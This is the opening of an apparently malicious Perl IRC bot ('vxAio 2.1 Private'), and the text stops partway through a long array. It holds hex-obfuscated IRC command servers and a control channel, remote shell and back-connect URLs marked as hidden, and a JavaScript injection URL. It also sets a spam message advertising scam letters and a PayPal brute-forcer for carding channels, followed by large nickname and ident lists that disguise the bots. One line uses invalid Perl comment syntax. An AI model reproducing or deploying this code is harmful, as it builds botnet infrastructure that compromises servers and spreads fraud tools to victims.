#!/usr/bin/perl
#
# vxAio 2.1 Private - xeQt.
#
# xeQt vS TeaMrx.

use IO::Select;
use IO::Socket;
use Socket;

#########################
# vxAio Perlbot By xeQt #
#########################

my @TeaMrx = (
"\x6e\x6a\x2e\x75\x73\x65\x72\x73\x2e\x75\x6e\x64\x65\x72\x6e\x65\x74\x2e\x6f\x72\x67"
);
my @myhood = ("\x23\x74\x75\x72\x62\x30\x63\x61\x73\x68");
//    #turb0cash

  my @ServList = (
"\x44\x69\x65\x6d\x65\x6e\x2e\x4e\x4c\x2e\x45\x55\x2e\x55\x6e\x64\x65\x72\x6e\x65\x74\x2e\x4f\x72\x67",
"\x6d\x65\x73\x61\x2e\x61\x7a\x2e\x75\x73\x2e\x75\x6e\x64\x65\x72\x6e\x65\x74\x2e\x6f\x72\x67",
    "\x65\x75\x2e\x75\x6e\x64\x65\x72\x6e\x65\x74\x2e\x6f\x72\x67",
    "\x75\x73\x2e\x75\x6e\x64\x65\x72\x6e\x65\x74\x2e\x6f\x72\x67"
  );

my @rport = ( "6665", "6666", "6667", "6668", "6669", "7000" );

my $xeqt       = "!x";
my $shad0w     = 1;
my $warned     = 1;
my $public     = 0;
my $pages      = 60;     # Max 100!
my $pag        = 500;
my $spmsgs     = 0;
my $safe_print = 0;      # Safemode echo?
my $google     = 1;
my $kvasir     = 1;
my $uol        = 1;
my $alltheweb  = 1;

my $xeQters  = "\x78\x65\x71\x74";    # Hide as! // xeQt
my $sendnick = "\x6e\x6a";

my $ascmethod = 0;                    # (Testing)!

my $cmdsh     = "http://www.javva.com/n?";
my $bcurl     = "http://www.javva.com/d?";    # Hidden!
my $showshell = "http://www.javva.com/r?";

# XSS Opt!
my $xsson = 0;                                # 0=off, 1=on.
my $tdrop = 4;
my $xsimg = "http://xeQt.com/xeqt.js";        # JS Injection!

my @spchans = (
    "#cc-visa",  "#www.ebay.com", "#ebay",        "#cc.visa",
    "#e-gold",   "#paypal",       "#legit-trade", "#Western-Union",
    "#cc-trade", "#carderi",      "#cc-power",    "#SendeR"
);
my $spmsg =
"(12Tools/12Scams) Last Scam+Letter(s)! Socks4/5 Scanner! PayPal checker/BruteForcer! And Other Usefulle Everyday Tools! 4http://members.lycos.co.uk/charlott1974/";

my @NickName = (
    "TeaMrx",     "fatys",     "elter",      "vxbots",
    "smufn",      "dualC",     "lees",       "carro",
    "frida",      "g1ra",      "speda",      "p3pper",
    "dings",      "dang",      "pling",      "singa",
    "asnl",       "manu",      "ispx",       "ipn",
    "d3lta",      "rom3o",     "jul1e",      "c4rbon",
    "g0ld3n",     "Gold3n",    "Seigm4n",    "seim4n",
    "kkk",        "gbv",       "ARPSpoof",   "ARPJunk",
    "Lovly",      "ARP",       "APR",        "Smufer",
    "Laban",      "Ladan",     "lada",       "fiats",
    "ox0ffff",    "oxo90",     "ox90",       "oxoo",
    "stdlibs",    "sshds",     "fri3k",      "prick",
    "d1ck",       "n000",      "j4maica",    "r0man",
    "l0st",       "el1te",     "m3ga",       "w1de",
    "scr3n",      "scr3am",    "p0wer",      "smurph",
    "Buren",      "Norway",    "Swed3n",     "n0w4y",
    "Ch3ss",      "p3st",      "f3bz",       "AAlarm",
    "KlogD",      "main",      "n0k1a",      "s1m3nz",
    "s3ven",      "el3ven",    "p4rty",      "qu1zz",
    "p1zz",       "pl1z",      "c4rgo",      "m4dz",
    "dMx",        "WuTANG",    "Clan",       "WuClan",
    "PPClan",     "Plano",     "Pluto",      "EvilR",
    "Subaru",     "EvoGT",     "c0per",      "Sunny",
    "Asuer",      "Sudoer",    "sUdo",       "Freeb5D",
    "Vifter",     "Vifta",     "TwinV",      "Wmx",
    "DnBanks",    "Smith",     "Juicy",      "Petr0l",
    "Petra",      "Faith",     "Lauren",     "OslO",
    "TeaM",       "Mrx",       "n0rd3a",     "dMbs",
    "dBSpro",     "Dbs",       "AntiABS",    "s0naren",
    "Ultra_vx",   "vxbOt",     "Toyotas",    "c99_xQt",
    "Riots",      "idiots",    "wIfI",       "WiFi",
    "Basics",     "Advanced",  "Perf0rms",   "dohcs",
    "PerlWaste",  "TastePHP",  "PhPerl",     "Perl-Php",
    "SendMail",   "MassMail",  "MasScan",    "Di3",
    "ScobY",      "dOOh",      "vMack",      "xMax",
    "CpuDrv",     "aCpu",      "Asko",       "Arni",
    "Petros",     "sigaro",    "Eminem",     "DrDr3",
    "dr3Dr",      "a2TheK",    "mRxeD",      "xxXxx",
    "SupRmAn",    "ScarFace",  "Bots3n",     "Makers",
    "s0nyEric",   "AsusR",     "RaSus",      "Radar",
    "w0rld",      "FuxThat",   "Scarf",      "FaceCut",
    "vMaxer",     "Silly",     "Aleen",      "InetdD",
    "FFlush",     "STDxQt",    "STDMrx",     "StdMax",
    "r57shell",   "r57_xeQt",  "PhpxQt",     "Exequte",
    "eXeQt",      "Flytene",   "Shady",      "laddy",
    "Lotto",      "vxAio",     "sql_inject", "sql_db",
    "err_sql",    "unionall",  "sel3ct",     "Eject",
    "sql_xQt",    "xeQt_db",   "xForum",     "xbb",
    "xSStEam",    "Exess",     "Axxess",     "Esse",
    "Vatoz",      "Muerte",    "Death",      "Clone",
    "eBayScam",   "Scam",      "ScamPag",    "PagScam",
    "PigScam",    "MailSpdr",  "KaRsR",      "LoGG",
    "hilti",      "Frieze",    "Pomfie",     "McDonal",
    "BrKing",     "IlTurbo",   "LeTurbo",    "php_safe",
    "php_index",  "w0rdz",     "popen",      "ProcOpen",
    "Sh_Exec",    "Execute",   "Lemanz",     "FiveCents",
    "DickHead",   "H3nrey",    "Johansen",   "Hans3m",
    "Poobel",     "Fakecc",    "ipfake",     "err_log",
    "stdio",      "stdlib",    "MyNick",     "MyDick",
    "MyBack",     "MayBack",   "SkyLine",    "TwojzGT-E",
    "Tsupra",     "Celica",    "d0h",        "Dina",
    "Hets",       "Hats",      "Nets",       "aVe",
    "Brk2",       "pJack",     "nc-vvlp",    "NetCat",
    "NetJack",    "ha",        "liq",        "dop",
    "heroin",     "dok",       "page",       "php3",
    "pop",        "smtp",      "data",       "kilde",
    "foss",       "lowrdr",    "drvby",      "viper",
    "snake",      "dragon",    "dup",        "vuln",
    "cat",        "grep",      "loop",       "inetd",
    "proftpd",    "Raptor",    "Two-6-13",   "usexqt22",
    "uselibs22",  "datalib",   "perlib",     "mysql_err",
    "sql_err",    "ByDrive",   "McUnder",    "UnderMc",
    "McDrive",    "Kawasaki",  "Yamaha",     "Sizuki",
    "h0nda",      "Spoond",    "pasive",     "damp",
    "wals",       "snoke",     "snik",       "poff",
    "phil",       "pill",      "dra",        "drjo",
    "djo",        "laby",      "rune",       "alan",
    "britt",      "brita",     "stue",       "stenen",
    "andy",       "bass",      "phatt",      "lover",
    "fresa",      "jvc",       "jbl",        "cia",
    "fed",        "sov",       "purk",       "snut",
    "snif",       "deka",      "svovel",     "life",
    "knife",      "so",        "deka",       "bos",
    "boss",       "fres",      "spett",      "dusj",
    "kappe",      "norman",    "keb0rd",     "fab",
    "dor",        "bits",      "kniv",       "lisa",
    "nina",       "ole",       "pat",        "mtv",
    "charl",      "smokie",    "nabo",       "walk",
    "brks",       "krad-3",    "se",         "no",
    "de",         "dk",        "it",         "fr",
    "op",         "mode",      "loc",        "sa",
    "za",         "yu",        "jufr",       "fred",
    "peace",      "tr",        "baat",       "bbc",
    "nbc",        "vcb",       "coffe",      "dark",
    "morkz",      "svart",     "neger",      "slave",
    "dohgz",      "dame",      "lady",       "bola",
    "biffen",     "kamm",      "drev",       "sprider",
    "spider",     "iscrem",    "daddy",      "pie",
    "ono",        "tima",      "mytm",       "motor",
    "vsmot",      "sport",     "fart",       "devs",
    "var",        "tmp",       "spol",       "sture" . "jule",
    "tree",       "gate",      "net",        "rand",
    "perl",       "line",      "xqt",        "mrx",
    "org",        "asus",      "sped",       "yaco",
    "hash",       "hmm",       "ddos",       "pwr",
    "nix",        "linux",     "bsd",        "ppal",
    "aio",        "mars",      "bates",      "daim",
    "da",         "pico",      "nmap",       "juge",
    "sone",       "log",       "goofy",      "kars",
    "meter",      "daim",      "kul",        "foksy",
    "hyena",      "beta",      "pulse",      "driver",
    "org",        "fos",       "kars",       "kma",
    "fua",        "all",       "tea",        "foks",
    "lady",       "fa",        "testo",      "bola",
    "bolen",      "card",      "cards",      "chip",
    "chips",      "wv",        "audi",       "bmw",
    "roys",       "bechs",     "nokia",      "mrx",
    "some",       "candy",     "goo",        "cool",
    "scam",       "scan",      "google",     "lee",
    "cam",        "li",        "dm",         "loff",
    "grov",       "abcd",      "pulse",      "grow",
    "alrt",       "spyd",      "trojn",      "maxd",
    "xeqtd",      "xQtd",      "nodz",       "pid",
    "slow",       "view",      "lmn",        "lsd",
    "lds",        "as",        "ass",        "pff",
    "yuo",        "had",       "afraid",     "africs",
    "Draco",      "pondus",    "Find0t",     "solno",
    "solis",      "hash",      "hasj",       "w33d",
    "Skunk",      "powder",    "asss",       "Djelno",
    "divas",      "f3ber",     "l0cos",      "putAs",
    "Fucks",      "Demper",    "Damps",      "silv3r",
    "m0m0rSs",    "Hal0",      "b3livn0t",   "n0b3liv",
    "mYlIfe",     "PacSlife",  "p3rlb0t",    "prylb0t",
    "vxAio",      "aioKit",    "Hallis",     "EarlMy",
    "MyEarl",     "Stigma",    "dJPulse",    "Sparko",
    "NetCat",     "nEtCated",  "Bc-txt",     "uselib22",
    "C22",        "CiaAgnt",   "Gturbo",     "NetSafe",
    "PerlMake",   "MakeFile",  "WXp",        "xeQting",
    "Ninja",      "Helen",     "hanne",      "t0nje",
    "freia",      "VBL",       "Cask",       "C0ldCase",
    "Spuds",      "Hasjen",    "Helena",     "Hitler",
    "smiley",     "dommy",     "t0mmy",      "all3n",
    "m4rius",     "suiram",    "carma",      "dama",
    "Hasjen",     "Stinger",   "PayPal",     "eBays",
    "wh0Shut",    "FiveShot",  "aJays",      "Dinomitt",
    "eXplo",      "eggDrop",   "vx8m0d",     "vx8b0t",
    "vx8prod",    "vxprod",    "oslocty",    "tester",
    "sucker",     "evers",     "MitsuEvo",   "ProSti",
    "AudiRS",     "Porche",    "EvilR",      "Toska",
    "Carerra",    "EvoVFQ",    "Simpsen",    "exec",
    "popen",      "passthrue", "system",     "proxopen",
    "phpvuln",    "phphat",    "phpwn",      "phpg3k",
    "Favor",      "dennsl",    "flam0r",     "kab0r",
    "Ab0rs",      "t0rsk",     "D0rsk",      "c0ded",
    "wiln3t",     "spyed",     "c0mon",      "ladas",
    "piller",     "Listnup",   "camaro",     "speeed",
    "spedd",      "sputnik",   "YouFace",    "nit0z",
    "turbon",     "gt78",      "gt66",       "ITSGT88",
    "service",    "farts",     "burb0n",     "nockfort",
    "SafeNod",    "Antii",     "TRD",        "bcdotxt",
    "Spread",     "HREF",      "class",      "Divaz",
    "Pagina",     "lang",      "no",         "se",
    "de",         "dk",        "fi",         "hu",
    "info",       "gr",        "pk",         "cagov",
    "edupk",      "eduas",     "netsverm",   "Newt0n",
    "cart0n",     "dellli",    "p3ppes",     "spedro",
    "n0zz",       "nxgaz",     "Phone",      "lii",
    "leee",       "Linux",     "FreeBSD",    "OpenBSD",
    "NetBSD",     "Fedora",    "RedHat",     "Corp",
    "HansE",      "Frida",     "M",          "Junni",
    "unni",       "Tonje",     "Else",       "ifnot",
    "version",    "LinuxOS",   "DarWinS0x",  "bl0wc0ce",
    "BassMan",    "TuneBass",  "NoisYa",     "Hitemup",
    "Mofoer",     "shit",      "TwinGate",   "MaBord",
    "eu0s",       "OsloLiga",  "TeaMOslo",   "Forum0id",
    "NULLuid",    "Dork",      "F0rks",      "Kniven",
    "Pock3t",     "udp",       "TcpxQt",     "UDPxQt",
    "SynxQt",     "xeQter",    "xeQt",       "Henriette",
    "ida",        "t0nny",     "Nille",      "doh",
    "TeaMrx1",    "TeaMrx0",   "TeaMrx2",    "TeaMrx3",
    "TeaMrx4",    "TeaMrx5",   "TeaMrx6",    "TeaMrx7",
    "Syrehue",    "Platas",    "Stroket",    "h0rer",
    "b0tp3rl",    "shellcmd",  "phptrue",    "phpfake",
    "ally",       "bling",     "vekk",       "datt",
    "hilton",     "paris",     "yeaah",      "ladies",
    "sexymom",    "liqit",     "Sierra",     "Focus",
    "STR10",      "Dodge",     "v10",        "v6",
    "R4",         "Boxer6",    "Boxer4",     "WrxSti",
    "joo",        "c0sw0rth",  "Linesky",    "Ferrari",
    "Lamboo",     "Flower",    "x4",         "x2",
    "x8s",        "xMann",     "xgirl",      "mIRC",
    "Hybrid",     "Scamer",    "paypal",     "eGold",
    "Format",     "unset",     "histfile",   "liqduo",
    "aVe",        "kmod",      "kmod2",      "uselib",
    "raptor",     "tmpSH",     "pwned",      "w00t",
    "DualDuo",    "Intel",     "xc90",       "v0lvo",
    "Saab",       "Viggen",    "Arcade",     "AkersMic",
    "Byp0rten",   "loveyou",   "Screwed",    "AMDPwr",
    "Geforce",    "Exploit",   "vx8m0d",     "indexs",
    "index",      "index2",    "index3",     "index4",
    "xQt1",       "xQt2",      "xQt3",       "xQt4",
    "xQt5",       "xQt6",      "xQt7",       "xQt8",
    "xQt9",       "xQt10",     "TeaMrxz",    "De",
    "Der",        "Det",       "Var",        "Kam",
    "Dea",        "Csa",       "Fbi",        "Dea",
    "Narko",      "Gone",      "Feber",      "Tull",
    "Tundra",     "st0rms",    "fLash",      "TheLight",
    "Nikko",      "Nikie",     "Nikkie",     "daniel",
    "t0nyandr",   "Europa",    "Fanta",      "Caroline",
    "speedline",  "Perf0rm",   "indexs",     "dan",
    "educat",     "catina",    "bindex",     "hindex",
    "n0rway",     "myphp",     "phpvuln",    "Alarma",
    "GoScan",     "oslocity",  "spette",     "Cascam",
    "vSport",     "vSmotor",   "vSteam",     "vSturbo",
    "Turbost",    "heeman",    "andy",       "loundry",
    "ranger",     "Carbon",    "TypeR",      "Nozz",
    "phpforum",   "Nxgas",     "NinaGirl",   "Isit",
    "lama",       "ouch",      "vTeam",      "vSpot",
    "vCrew",      "xeQta",     "Gourl",      "Vulnx",
    "Hksurl",     "Greedy",    "Mrx",        "counyjail",
    "Spourl",     "Torshov",   "Oslos",      "com_xeqt",
    "mowgli",     "Asus",      "com_mrx",    "MrxTeam",
    "arrest",     "vScrew",    "beran",      "stuing",
    "ucutter",    "readnot",   "gethelp",    "curpos",
    "cutext",     "Busted",    "Rover",      "Hunday",
    "Bank0k",     "Twinz",     "Wish",       "Stomp",
    "Jointz",     "Pufpuff",   "c0ntext",    "liq",
    "detda",      "kanjo",     "neinei",     "Carbon",
    "irriter",    "masa",      "dev-null",   "korsett",
    "PerlTeam",   "Paller",    "Elkopn",     "MiNiBank",
    "Safem0d",    "D3ppa",     "yahrght",    "locator",
    "SpamAss",    "dir",       "jada",       "kanjeg",
    "mutterz",    "dalenmin",  "heimdal",    "Gambler",
    "Deanz",      "Phreak",    "Getno",      "Terga",
    "targa",      "upc",       "scr3wer",    "p3rlmagic",
    "onodos",     "quepasa",   "d33ns",      "audivw",
    "Susa",       "Pils",      "Pilz",       "Bilz",
    "Clubz",      "Clubs",     "Clubbin",    "Fights",
    "Kampen",     "telenor",   "Karss",      "Gophy",
    "reactor",    "fileporn",  "filemp3",    "filelist",
    "free6",      "purextc",   "upc",        "Grandis",
    "Piccaso",    "Vanda",     "varburen",   "Tiesto",
    "Jean",       "DjEan",     "MeNe",       "ThiS",
    "nO",         "drspeed",   "fuzzy",      "buzzz",
    "GoScan",     "Vulned",    "Gourl",      "makeconf",
    "sshdconf",   "ngtno",     "m0rtem",     "cat0",
    "Fuckyall",   "Fuckit",    "Aem",        "Greedy",
    "Hkss",       "Sparco",    "MoMo",       "Carbon",
    "d3nyall",    "vipz",      "dualc0rz",   "twoc0re",
    "gotit",      "h0lyshit",  "prtls",      "rapt0r",
    "Getde",      "Vulnx",     "d3nyurl",    "vUlnurl",
    "v0dka",      "Torshov",   "turboo",     "Boost",
    "fasty",      "fr",        "getfr",      "datacore",
    "dualcore",   "Daniel",    "spurv",      "byrds",
    "jails",      "spoot",     "speels",     "ml",
    "getd",       "Antivi",    "nod32",      "Screwed",
    "alias",      "mekkka",    "template",   "f0rm3",
    "p0ker",      "Geton",     "NO",         "Door",
    "Borr",       "Jaarn",     "Sporet",     "Dopa",
    "Hasjen",     "purxTc",    "Liquer",     "Justlink",
    "Asust",      "Duffin",    "Durrett",    "Dussault",
    "Dwyer",      "Eardley",   "Ebeling",    "Eckel",
    "Edley",      "Edner",     "Edward",     "Eickenhorst",
    "Eliasson",   "Erdos",     "Erez",       "Espinoza",
    "Estes",      "Etter",     "Eina",       "Elmendorf",
    "Elmerick",   "Elvis",     "Encinas",    "Enyeart",
    "Eppling",    "Erbach",    "Erdman",     "d0",
    "Everett",    "Fabbris",   "Fagan",      "Faioes",
    "Altavista",  "Flamor",    "Faris",      "Farone",
    "f00ln3t",    "Farren",    "Fasso'",     "Fates",
    "Feigenbaum", "Fejzo",     "Feldman",    "Euripides",
    "Enzoo",      "d00rk",     "Wikii",      "Wifii",
    "Jvc",        "s0nny",     "lekter",     "herrier",
    "sp0ker",     "netply",    "netb0st",    "Liq",
    "comma",      "julie",     "sveina",     "andre",
    "pulsedj",    "p0ker",     "j0ker",      "eFn3t",
    "Liers",      "xTcno",     "Suite",      "Incl",
    "Page",       "Mappe",     "Oxyd",       "Infode",
    "Senil",      "Powers",    "Langu",      "m0d",
    "doch",       "Snakes",    "Ridder",     "Viking",
    "Vikings",    "Norman",    "Norway",     "German",
    "Info",       "Biz",       "Edud",       "Ninjas",
    "Ilness",     "Teacer",    "Faceoff",    "devnull",
    "MoMo",       "Spoon",     "Liquid",     "Goofy",
    "Aj",         "Google",    "Yahoo",      "Altavista",
    "Lycos",      "Sesam",     "Solno",      "Googler",
    "ScamNet",    "w0rmnet",   "puman",      "Skeidar",
    "Tinemelk",   "Freia",     "Tresis",     "Tbanen",
    "Adenyed",    "Hulken",    "Pureice",    "Sperre",
    "Lister",     "Burbon",    "burb0ns",    "Toy0",
    "Proxes",     "WrxSti",    "Evo6",       "Evo7",
    "Evo8",       "wss",       "bss",        "natron",
    "kiwis",      "Reman",     "SevnUp",     "Perlpls",
    "Spiid",      "Govbr",     "Govmil",     "Wssss",
    "Files",      "xFiles",    "Dataw0rm",   "n3tw0rm",
    "Info",       "Biz",       "Orgy",       "foksy",
    "Reven",      "limbo",     "mambi",      "bambi",
    "rummy",      "IluvPerl",  "PerlKing",   "Pokerking",
    "Turboa",     "Gttt",      "BugScam",    "BugTraq",
    "Trackqs",    "Que",       "Adidas",     "Umbro",
    "Sportas",    "Liquid",    "Forume",     "Deka",
    "Jbl",        "Adecco",    "M5R",        "Tuners",
    "Techno",     "Sivilen",   "Baosh",      "Snuten",
    "Purken",     "aaudi",     "coupe",      "netliga",
    "liganet",    "netbase",   "NetSnok",    "Snoknet",
    "Snifnet",    "libz",      "indexp",     "jooblaa",
    "mamboo",     "Binl3n",    "Cplusplus",  "p3rls3x",
    "illgoon",    "de",        "lime",       "homes",
    "newsr",      "sindex",    "findex",     "shome",
    "php3",       "eedan",     "Evens",      "Everest",
    "kkk2",       "igal",      "c0lombia",   "freeme",
    "dupen",      "d3nmark",   "s2ed3n",     "crypt0n",
    "n0dam3n",    "itch",      "Domino",     "Tarsan",
    "julie",      "Anett",     "Stine",      "Laura",
    "Croft",      "Craft",     "Mrex",       "jiggy",
    "Hemaan",     "c0nan",     "c0nmen",     "ImI",
    "RdR",        "Ils",       "Ass",        "Dildo",
    "Pula",       "Blow",      "Sn0rts",     "Petshop",
    "Snifshop",   "SnIffed",   "Pwned",      "uselib23",
    "kullos",     "sooot",     "sort",       "viis",
    "Petra",      "Hunden",    "Gaffel",     "plsdrv",
    "aslme",      "hvasa",     "Skjeera",    "Noway",
    "Bl0wfish",   "Aloalo",    "Nasa",       "DeaGov",
    "FbiGov",     "NsaGov",    "CiaGov",     "CsiEdu",
    "Hav0rd",     "djPulse",   "Limb0",      "j00mla",
    "mamb0",      "Calender",  "f0rums",     "cmsss",
    "ssmss",      "liquer",    "hardc0re",   "mega",
    "Dop3r",      "haai",      "flyy",       "byyy",
    "drvby",      "driveby",   "killall",    "netstat",
    "pets",       "pedros",    "dogn",       "rythm",
    "baSs",       "F3ber",     "Juge",       "loverr",
    "p3rlb0t",    "eFnEt",     "perlx",      "remax",
    "rik",        "fatig",     "poor",       "girls",
    "pow",        "wop",       "wok",        "son",
    "kolsa",      "royk",      "asss",       "los",
    "las",        "angl",      "dream",      "fools",
    "phol",       "phools",    "d0rk",       "spoon",
    "spalk",      "kalk",      "sd",         "lang",
    "src",        "loc",       "do",         "go",
    "for",        "join",      "cat",        "cmd",
    "base",       "liq",       "now",        "ya",
    "email",      "smtp",      "pops",       "imapd",
    "pag",        "lang",      "lg",         "nav",
    "php",        "spyer",     "cyp",        "hardy",
    "email",      "null",      "mastr",      "drunk",
    "full",       "beer",      "bayer",      "mage",
    "neve",       "fist",      "haist",      "dara",
    "dora",       "boris",     "dev",        "cupra",
    "isgal",      "Yuri",      "Geez",       "Frys",
    "dos",        "to",        "emul",       "pwned",
    "kung",       "kim",       "lil",        "fatjo",
    "fatman",     "fat",       "joe",        "does",
    "quat",       "tres",      "eu",         "shv5",
    "lrk",        "lkm",       "lkmrk",      "trk5",
    "xt",         "tqex",      "itt",        "full",
    "half",       "power",     "sender",     "does",
    "tres",       "quat",      "fiat",       "spon",
    "kvae",       "liim",      "papp",       "ddos",
    "fart",       "noz",       "daim",       "liga",
    "tvone",      "shdw",      "etcpwd",     "initd",
    "ftpd",       "wuspl",     "proftp",     "newsd",
    "sockd",      "lue",       "loma",       "Domma",
    "hest",       "heist",     "tivoli",     "stud",
    "dust",       "fust",      "Flue",       "nille",
    "kenny",      "koma",      "loc",        "inc",
    "incl",       "src",       "fokus",      "ford",
    "chevy",      "wrc",       "cpu",        "cool",
    "srchers",    "inc",       "incl",       "dir",
    "file",       "sdir",      "mains",      "login",
    "path",       "base",      "cmd",        "cats",
    "farts",      "hu",        "no",         "lo",
    "po",         "pot",       "top",        "lot",
    "mo",         "yu",        "hy",         "ty",
    "tyr",        "fyr",       "flame",      "dir",
    "fiat",       "uno",       "jern",       "kober",
    "liq",        "torsk",     "fisk",       "laks",
    "hone",       "hore",      "buk",        "noman",
    "luv",        "aix",       "dupli",      "form",
    "dali",       "kath",      "vx8",        "m0d",
    "gforce",     "bond",      "golden",     "eye",
    "lim",        "idem",      "prince",     "sveina",
    "kine",       "kim",       "allan",      "hanne",
    "terje",      "bukken",    "bruse",      "info",
    "cpu",        "pet",       "pacs",       "dino",
    "megov",      "onet",      "xrm",        "tisi",
    "parm",       "cico",      "jun",        "Ri",
    "caos",       "fred",      "peace",      "dude",
    "rox",        "rock",      "rokie",      "bayrn",
    "gees",       "hval",      "wolf",       "h000",
    "wget",       "fetch",     "get",        "lynx",
    "lwp",        "down",      "load",       "ers",
    "niners",     "nigga",     "phunk",      "d000",
    "do",         "go",        "ln",         "st",
    "file",       "page",      "pag",        "pg",
    "lg",         "lang",      "lng",        "srcs",
    "action",     "h0nk",      "sml",        "pod",
    "nvidia",     "vidia",     "villa",      "kake",
    "spat",       "solo",      "Cols",       "kols",
    "kreft",      "dork",      "chat",       "mirc",
    "bitchx",     "http",      "apache",     "www-data",
    "logs",       "loco",      "print",      "echos",
    "f0rk",       "cool",      "phool",      "dorks",
    "forki",      "cute",      "matrix",     "five",
    "tre",        "two",       "ono",        "does",
    "d0nal",      "nu",        "do",         "li",
    "faen",       "tater",     "doc",        "loc",
    "pof",        "ninja",     "per",        "pets",
    "sings",      "doper",     "Oslos",      "Ils",
    "cia",        "d3a",       "dea",        "nsa",
    "nas",        "asa",       "kma",        "Scamurl",
    "vito",       "xQt",       "Defa"
);

my @Idents = (
    "noway",    "mirc",           "cmd",    "index",
    "main",     "php",            "vuln",   "iiris",
    "bx",       "sun",            "khan",   "senke",
    "tomo",     "dice",           "kaney",  "bruce",
    "lesli",    "stand",          "forks",  "stdlib",
    "stdout",   "luv",            "dove",   "sope",
    "opra",     "sucki",          "stupid", "argv",
    "argc",     "argi",           "ari",    "ben",
    "dd",       "n4s",            "biatch", "loc0",
    "p0ta",     "portal",         "aspx",   "aspa",
    "jsp",      "jsps",           "phpbb",  "bbphp",
    "h4ns",     "nype",           "dona",   "fr3d",
    "c4ren",    "ronja",          "ant0n",  "emil",
    "pobler",   "hssjj",          "baa",    "title",
    "mainz",    "fantom",         "billy",  "hansu",
    "hansi",    "gunter",         "alx",    "febers",
    "fedss",    "tities",         "bryst",  "kodd",
    "fodd",     "evilz",          "elita",  "tvx",
    "tvr",      "kvr",            "lmt",    "hellsang",
    "Thiss",    "clas",           "daft",   "pdrv",
    "pdal",     "azuz",           "feduz",  "pedo",
    "ferd",     "roman",          "norman", "hidn",
    "flom",     "slow",           "flow",   "lows",
    "give",     "stop",           "pause",  "reply",
    "mari",     "hiper",          "sqlms",  "rawsql",
    "sqlraw",   "rawmod",         "botraw", "sraw",
    "praw",     "pfork",          "spork",  "spark",
    "soon",     "ond",            "park",   "break",
    "stoms",    "storm",          "evilr",  "revil",
    "mann",     "gunda",          "fader",  "hunday",
    "corwet",   "hardc0r",        "fiffy",  "fiveo",
    "copp",     "coops",          "linda",  "chilli",
    "nort",     "heil",           "opra",   "ophra",
    "bills",    "cbill",          "ccbill", "dexter",
    "sparco",   "recaro",         "bills",  "deli",
    "deluca",   "nisse",          "lasse",  "kjell",
    "ingar",    "line",           "prince", "wanter",
    "hitler",   "asdf",           "zxcv",   "divx",
    "warez",    "card",           "visa",   "shop",
    "phpx",     "xphp",           "mrxed",  "vulkan",
    "hauk",     "kane",           "fame",   "dumbo",
    "efnet",    "unet",           "usnet",  "psnet",
    "xnet",     "damp",           "sooo",   "manu",
    "shadow",   "sths",           "stdin",  "stdout",
    "stderr",   "errs",           "puff",   "daddy",
    "devil",    "info",           "cpu",    "pet",
    "pacs",     "dino",           "megov",  "onet",
    "xrm",      "tisi",           "parm",   "cico",
    "jun",      "caos",           "fred",   "peace",
    "dude",     "rox",            "rock",   "rokie",
    "bayrn",    "gees",           "hval",   "wolf",
    "wget",     "fetch",          "get",    "lynx",
    "lwp",      "down",           "load",   "ers",
    "niners",   "nigga",          "phunk",  "do",
    "go",       "ln",             "st",     "file",
    "page",     "pag",            "pg",     "lg",
    "lang",     "lng",            "srcs",   "action",
    "sml",      "pod",            "nvidia", "vidia",
    "villa",    "kake",           "spat",   "solo",
    "Cols",     "kols",           "kreft",  "chat",
    "mirc",     "bitchx",         "http",   "apache",
    "www-data", "logs",           "loco",   "print",
    "echos",    "cool",           "phool",  "dorks",
    "forki",    "cute",           "matrix", "five",
    "tre",      "two",            "ono",    "does",
    "lam",      "fal",            "dett",   "drop",
    "snop",     "true",           "fake",   "yes",
    "sir",      "mae",            "nmf",    "vmax",
    "as",       "adio",           "audo",   "soren",
    "tvtre",    "host",           "unitd",  "coda",
    "cobra",    "mans",           "gmail",  "gtrs",
    "remax",    "rik",            "fatig",  "poor",
    "girls",    "pow",            "wop",    "wok",
    "son",      "kolsa",          "royk",   "asss",
    "los",      "las",            "angl",   "dream",
    "fools",    "phol",           "phools", "d0rk",
    "spoon",    "spalk",          "kalk",   "one",
    "two",      "tree",           "foure",  "five",
    "six",      "aight",          "nine",   "clan",
    "script",   "spon",           "hok",    "sd",
    "lang",     "src",            "loc",    "do",
    "go",       "for",            "join",   "cat",
    "cmd",      "base",           "liq",    "now",
    "ya",       "email",          "smtp",   "pops",
    "imapd",    "pag",            "lang",   "lg",
    "nav",      "php",            "spyer",  "cyp",
    "hardy",    "email",          "null",   "mastr",
    "drunk",    "full",           "beer",   "bayer",
    "mage",     "neve",           "fist",   "haist",
    "dara",     "dora",           "boris",  "dev",
    "cupra",    "isgal",          "Yuri",   "Geez",
    "Frys",     "dos",            "to",     "emul",
    "pwned",    "kung",           "kim",    "lil",
    "fatjo",    "fatman",         "fat",    "joe",
    "does",     "quat",           "tres",   "eu",
    "shv5",     "lrk",            "lkm",    "lkmrk",
    "trk5",     "xt",             "tqex",   "itt",
    "full",     "half",           "power",  "sender",
    "does",     "tres",           "quat",   "fiat",
    "spon",     "kvae",           "liim",   "papp",
    "ddos",     "fart",           "noz",    "daim",
    "liga",     "tvone",          "shdw",   "etcpwd",
    "initd",    "ftpd",           "wuspl",  "proftp",
    "newsd",    "sockd",          "lue",    "loma",
    "Domma",    "hest",           "heist",  "tivoli",
    "stud",     "dust",           "fust",   "Flue",
    "nille",    "kenny",          "koma",   "loc",
    "inc",      "incl",           "src",    "fokus",
    "ford",     "chevy",          "wrc",    "cpu",
    "cool",     "srchers",        "inc",    "incl",
    "dir",      "file",           "sdir",   "mains",
    "login",    "path",           "base",   "cmd",
    "cats",     "farts",          "hu",     "no",
    "lo",       "po",             "pot",    "top",
    "lot",      "mo",             "yu",     "hy",
    "ty",       "tyr",            "fyr",    "flame",
    "dir",      "fiat",           "uno",    "jern",
    "kober",    "liq",            "torsk",  "fisk",
    "laks",     "hone",           "hore",   "buk",
    "noman",    "luv",            "aix",    "dupli",
    "form",     "dali",           "kath",   "vx8",
    "m0d",      "gforce",         "bond",   "golden",
    "eye",      "lim",            "idem",   "prince",
    "sveina",   "kine",           "kim",    "allan",
    "hanne",    "terje",          "bukken", "bruse",
    "nu",       "do",             "li",     "faen",
    "tater",    "doc",            "loc",    "pof",
    "ninja",    "per",            "pets",   "sings",
    "doper",    "liq",            "dop",    "heroin",
    "dok",      "page",           "php3",   "pop",
    "smtp",     "data",           "kilde",  "foss",
    "lowrdr",   "drvby",          "viper",  "snake",
    "dragon",   "dup",            "vuln",   "cat",
    "grep",     "loop",           "inetd",  "proftpd",
    "pasive",   "damp",           "wals",   "snoke",
    "snik",     "poff",           "phil",   "pill",
    "dra",      "drjo",           "djo",    "laby",
